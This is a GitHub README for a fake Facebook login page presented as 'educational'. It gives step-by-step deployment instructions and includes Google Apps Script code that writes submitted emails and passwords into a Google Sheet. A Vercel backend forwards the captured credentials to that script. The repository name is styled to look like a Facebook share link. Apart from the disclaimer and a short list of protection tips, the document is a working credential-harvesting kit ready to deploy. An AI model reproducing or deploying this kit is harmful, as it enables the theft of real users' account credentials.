# Facebook Phishing (Educational Purpose Only)

This repository demonstrates how attackers can potentially hijack user credentials through phishing techniques. The purpose of this project is to **educate users** about the risks of phishing attacks and to help developers and security professionals understand how to protect against such threats.

---

## ⚠️ Disclaimer

This project is strictly for **educational purposes** and **ethical testing** only. It is intended to raise awareness about phishing attacks and to help individuals and organizations improve their security practices. 

**Do not use this project for malicious purposes.** Unauthorized use of this code to collect user credentials or perform phishing attacks is illegal and unethical. The repository owner is not responsible for any misuse of this code.

---

## Features

- Demonstrates how attackers can create a fake login page to collect user credentials.
- Uses a Google Apps Script to simulate data collection (e.g., storing credentials in a Google Sheet).
- Includes a serverless backend (Vercel) to handle form submissions securely.

---

## How to Use

### 1. Clone the Repository
```bash
git clone https://github.com/IsaacTalb/www.facebook.com-share-memes-1829839408490847.git
cd www.facebook.com-share-memes-1829839408490847
```
### 2. Install Dependencies
Install the required dependencies using npm:
```bash
npm install
```
### 3. Obtain Google Sheet ID and run AppScript
In order to run Appscript, add name Email and Password Column in Google Sheet. And

1.  Go to the Extensions Tab on (beside of Data & Tools) and click AppScript.
2.  In Code.gs; you copy pasted below code and replace with your Google Sheet ID.
3.  Your Google Sheet ID is in the URL of google sheet between /d/ and /edit? (example: https://docs.google.com/spreadsheets/d/YOUR_GOOGLE_SHEETS_ID/edit?gid=0#gid=0)
4.  Copy that sheet ID only and paste it to the code below.
5.  Now Click Deploy, New Deploy and Click Select Type Settings and choose Web App.
6.  And now write Description(as you want), excute as your mail address, and choose "Anyone" for "Who has access"
7.  After that you can start deploy and Copy the web app URL. and follow Step.4 .env Variables.
```bash
    function doPost(e) {
    try {
        Logger.log("Received data: " + JSON.stringify(e));

        if (!e || !e.parameter.email || !e.parameter.password) {
        Logger.log("Error: Missing required fields");
        return ContentService.createTextOutput(JSON.stringify({ error: "Missing required fields" }))
            .setMimeType(ContentService.MimeType.JSON);
        }

        var sheet = SpreadsheetApp.openById("YOUR_GOOGLE_SHEET_ID").getActiveSheet();
        sheet.appendRow([e.parameter.email, e.parameter.password, new Date()]);

        Logger.log("Data added to sheet");
        return ContentService.createTextOutput(JSON.stringify({ status: "Success" }))
        .setMimeType(ContentService.MimeType.JSON);
    } catch (error) {
        Logger.log("Error: " + error.message);
        return ContentService.createTextOutput(JSON.stringify({ error: error.message }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    }
```

### 4. Set up Environment Variables
Create a .env file in the root directory and add the following:
```bash
SCRIPT_GOOGLE_URL="https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec"
```
Replace YOUR_GOOGLE_SCRIPT_ID with the deployment URL of your Google Apps Script.

### 5. Deploy to Vercel

1. Push the repository to Github.
2. Connect the repository to Vercel.
3. Add the SCRIPT_GOOGLE_URL environment variable in the Vercel dashboard.
4. Deploy the project.

So now you all done.

## Educational Goals
This project is designed to:
    1. Teach developers how phishing attacks work.
    2. Help security professional identify and mitigate phishing attempts.
    3. Educate users about the importance of verifying URLs and avoiding fake login pages.
    4. And **importanly** even in real website such as Tech, EDU, ORG website, the attackers can gain access from backdoors and set up those hijacking tools.

## How to Protect Yourself

1.  Verify URLs: Always check the URL of a login page to ensure it is legitimate.
2.  Enbale Two-Factor Authentication(2FA): Use 2FA to add an extra layer of security to your accounts.
3.  Educate Users: Share knowledge about phishing attacks with others to help them stay safe online.
4.  Use Security Tools: Implement tools like email filters and browser extensions to detect phishing attempts.
5.  Share this project: Share this project with friends and family to educate them about phishing attacks.

<hr>

## License 

This project is licensed under the MIT License. See the LICENSE file for details.

<hr>

## Contributing 

Contributions are welcome! If you have suggestions for improving this project or adding more educational content, feel free to open issue or submit a pull request.

<hr>

## Acknowledgments

This project is inspired by the need to educate users and developers about the dangers of phishing attacks. Special thanks to <a href="https://isaac.duckcloud.info"> Isaac Talb </a> and Open-Source Community for providing tools and resources to make this project possible.

